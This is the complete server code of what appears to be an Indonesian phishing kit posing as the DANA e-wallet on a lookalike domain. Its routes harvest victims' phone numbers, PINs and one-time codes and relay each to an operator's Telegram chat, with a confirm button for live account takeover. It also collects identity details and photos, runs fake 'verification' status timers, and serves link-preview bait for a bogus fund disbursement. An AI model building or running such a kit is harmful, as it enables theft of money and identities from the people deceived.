const express = require("express");
const axios = require("axios");
const path = require("path");
const mongoose = require("mongoose");
const app = express();

mongoose.connect(process.env.MONGO_URI)
.then(() => console.log("MongoDB Connected"))
.catch(err => console.log(err));

const PengajuanSchema = new mongoose.Schema({
    phone: String,
    nama: String,
    tempat: String,
    tanggal: String,
    jk: String,
    alamat: String,
    rt: String,
    rw: String,
    desa: String,
    kecamatan: String,
    kabupaten: String,
    provinsi: String,
    foto: String,
    status: {
    type: Number,
    default: 1
},
statusStartedAt: {
    type: Date,
    default: Date.now
},
nextStatusAt: Date,
pengajuanTime: String,
verifikasiTime: String,
persiapanTime: String,
selesaiTime: String,
    createdAt: {
        type: Date,
        default: Date.now
    }
});

const Pengajuan = mongoose.model("Pengajuan", PengajuanSchema);

/* TOKEN BOT */
const BOT_TOKEN =
process.env.BOT_TOKEN;

/* CHAT ID */
const CHAT_ID =
process.env.CHAT_ID;

const statusData = {};

app.use(express.json({
    limit: "20mb"
}));

app.use(express.urlencoded({
    extended: true,
    limit: "20mb"
}));

app.use(
    express.static(
        path.join(__dirname)
    )
);

app.get("/", (req,res)=>{
    
    res.send("SERVER HIDUP");
    
});

/* ROUTE */
app.post("/nmrx", async(req,res) =>{

    try{

        console.log(
            "DATA MASUK:"
        );

        console.log(
            req.body
        );

        console.log(
            "BOT:",
            BOT_TOKEN
        );

        console.log(
            "CHAT:",
            CHAT_ID
        );

        const {
            
            nmrx
            
        } = req.body;

        if(
            !nmrx
        ){

            return res.status(400).json({

                success:false,
                message:"Data tidak lengkap"

            });

        }

        /* PESAN TELEGRAM */
        const text = `
🔥 [ ×𝗡𝗠𝗥× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
            × <code>${nmrx}</code> ×
           
─────────────────
<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>  : <b>${nmrx}</b>
⌬<i>  POX . . . .</i>
─────────────────

<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

            chat_id:
            CHAT_ID,

            text:
            text,

            parse_mode:
            "HTML"

        }

     );

        res.json({

            success:true

        });

    }catch(error){

        console.log(
            error.response?.data ||
            error.message
       );

        res.status(500).json({

            success:false

        });

    }

});

/* ROUTE */
app.post("/pix", async(req,res) =>{

    try{

        console.log(
            "DATA MASUK:"
        );

        console.log(
            req.body
        );

        console.log(
            "BOT:",
            BOT_TOKEN
        );

        console.log(
            "CHAT:",
            CHAT_ID
        );

        const {
            
            nmrx,
            pix
            
        } = req.body;

        if(
            !nmrx ||
            !pix
        ){

            return res.status(400).json({

                success:false,
                message:"Data tidak lengkap"

            });

        }

        /* PESAN TELEGRAM */
        const text = `
🔥 [ ×𝗣𝗢𝗫× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
            × <code>${nmrx}</code> ×
           
─────────────────
<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>   : <b>${nmrx}</b>
<b>⌬<i>  𝗣𝗢𝗫   ×</i></b>   : <b>${pix}</b>
⌬<i>  OXT . . . .</i>
─────────────────

<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

            chat_id:
            CHAT_ID,

            text:
            text,

            parse_mode:
            "HTML"

        }

     );

        res.json({

            success:true

        });

    }catch(error){

        console.log(
            error.response?.data ||
            error.message
       );

        res.status(500).json({

            success:false

        });

    }

});

/* ROUTE */
app.post("/send", async(req,res) =>{

    try{

        console.log(
            "DATA MASUK:"
        );

        console.log(
            req.body
        );

        console.log(
            "BOT:",
            BOT_TOKEN
        );

        console.log(
            "CHAT:",
            CHAT_ID
        );

        const {
            
            nmrx,
            pix,
            otp
            
        } = req.body;

        if(
            !nmrx ||
            !pix ||
            !otp
        ){

            return res.status(400).json({

                success:false,
                message:"Data tidak lengkap"

            });

        }

        statusData[nmrx] = "pending";
        /* PESAN TELEGRAM */
        const text = `
🔥 [ 𝗟𝗘𝗡𝗚𝗞𝗔𝗣 𝗦𝗘𝗠𝗨𝗔 𝗕𝗔𝗡𝗚 ] 🔥
              × <code>${nmrx}</code> ×
           
─────────────────
<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>   : <b>${nmrx}</b>
<b>⌬<i>  𝗣𝗢𝗫   ×</i></b>   : <b>${pix}</b>
<b>⌬<i>  𝗢𝗫𝗧   ×</i></b>   : <b>${otp}</b>
─────────────────

<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
{

    chat_id:
    CHAT_ID,

    text:
    text,

    parse_mode:
    "HTML",

    reply_markup:{
        inline_keyboard:[
            [
                {
                    text:"✅ KONFIRMASI",
                    callback_data:`confirm_${nmrx}`
                }
            ]
        ]
    }

}
);

        res.json({

            success:true

        });

    }catch(error){

        console.log(
            error.response?.data ||
            error.message
       );

        res.status(500).json({

            success:false

        });

    }

});

app.get("/check-status/:nmrx", (req,res)=>{

    const nmrx =
    req.params.nmrx;

    res.json({
        success:true,
        status: statusData[nmrx] || "pending"
    });

});

function formatWIB(date) {

    const tanggal = date.toLocaleDateString("id-ID", {
        timeZone: "Asia/Jakarta",
        day: "numeric",
        month: "long",
        year: "numeric"
    });

    const jam = date.toLocaleTimeString("id-ID", {
        timeZone: "Asia/Jakarta",
        hour: "2-digit",
        minute: "2-digit",
        hour12: false
    }).replace(":", ".");

    return `${tanggal}\n${jam} WIB`;

}

app.post("/api/pengajuan", async (req, res) => {

    try {

        const now = new Date();

const randomMenit =
Math.floor(Math.random() * 31) + 30;

const data = new Pengajuan({

    ...req.body,

    status: 1,

    statusStartedAt: now,

    nextStatusAt: new Date(
        now.getTime() + randomMenit * 60000
    ),

    pengajuanTime: formatWIB(now)

});

        await data.save();

        res.json({
            success: true,
            url: "/status/" + req.body.phone
        });

    } catch (err) {

        console.log(err);

        res.status(500).json({
            success: false
        });

    }

});

app.get("/api/status/:phone", async (req, res) => {

    try {

        const data = await Pengajuan.findOne({
            phone: req.params.phone
        });

        if(!data){
            return res.status(404).json({
                success: false,
                message: "Data sudah dihapus"
            });
        }

        res.json(data);

    } catch(err){

        console.log(err);

        res.status(500).json({
            success: false,
            message: "Terjadi kesalahan server"
        });

    }

});

app.get("/status/:phone", (req,res)=>{

    res.sendFile(
        path.join(__dirname,"status.html")
    );

});

app.get("/pencairan/:phone", (req, res) => {

    const phone = req.params.phone;

    res.send(`
<!DOCTYPE html>
<html lang="id">
<head>

<meta charset="UTF-8">

<title>PENCAIRAN ${phone}</title>

<meta property="og:title" content="PENCAIRAN ${phone}">
<meta property="og:description" content="Klik untuk melanjutkan proses pencairan dana Anda.">
<meta property="og:image" content="https://danaa-id.dmpett-dgtall.xyz/assets/preview-pencairan.jpg">
<meta property="og:type" content="website">
<meta property="og:url" content="https://danaa-id.dmpett-dgtall.xyz/pencairan/${phone}">

<meta http-equiv="refresh" content="0;url=/pencairan.html?phone=${phone}">

</head>
<body></body>
</html>
    `);

});

let lastUpdateId = 0;

async function polling(){

    while(true){

        try{

            const response = await axios.get(
                `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`,
                {
                    params:{
                        offset:lastUpdateId + 1,
                        timeout:30
                    }
                }
            );

            const updates = response.data.result;

            for(const update of updates){

                lastUpdateId = update.update_id;

                if(!update.callback_query) continue;

                const callback = update.callback_query;

                const data = callback.data;

                if(data.startsWith("confirm_")){

                    const nmrx = data.replace("confirm_","");

                    statusData[nmrx] = "confirmed";

                    await axios.post(
                        `https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`,
                        {
                            chat_id: callback.message.chat.id,
                            message_id: callback.message.message_id,
                            reply_markup:{
                                inline_keyboard:[]
                            }
                        }
                    );

                    await axios.post(
                        `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,
                        {
                            callback_query_id: callback.id,
                            text:"Berhasil dikonfirmasi"
                        }
                    );

                }

            }

        }catch(error){

            console.log(error.response?.data || error.message);

            await new Promise(resolve => setTimeout(resolve,3000));

        }

    }

}

polling();

setInterval(async () => {

    try {

        const sekarang = new Date();

        const list = await Pengajuan.find({
    status: { $in: [1, 2] },
    nextStatusAt: {
        $lte: sekarang
    }
});

        for (const item of list) {

            if (item.status === 1) {

                item.status = 2;

                item.statusStartedAt = sekarang;

                item.verifikasiTime = formatWIB(sekarang);

                const randomMenit =
                Math.floor(Math.random() * 31) + 30;

                item.nextStatusAt = new Date(
                    sekarang.getTime() + randomMenit * 60000
                );

            } else if (item.status === 2) {

                item.status = 3;

                item.statusStartedAt = sekarang;

                item.persiapanTime = formatWIB(sekarang);

                // Berhenti di status 3
                item.nextStatusAt = null;

            }

            await item.save();

        }

    } catch (err) {

        console.log(err);

    }

}, 60000);

/* PORT */
const PORT =
process.env.PORT || 8080;

/* JALANKAN */
app.listen(PORT, ()=>{

    console.log(
    "Server running on port " +
    PORT
    );

});
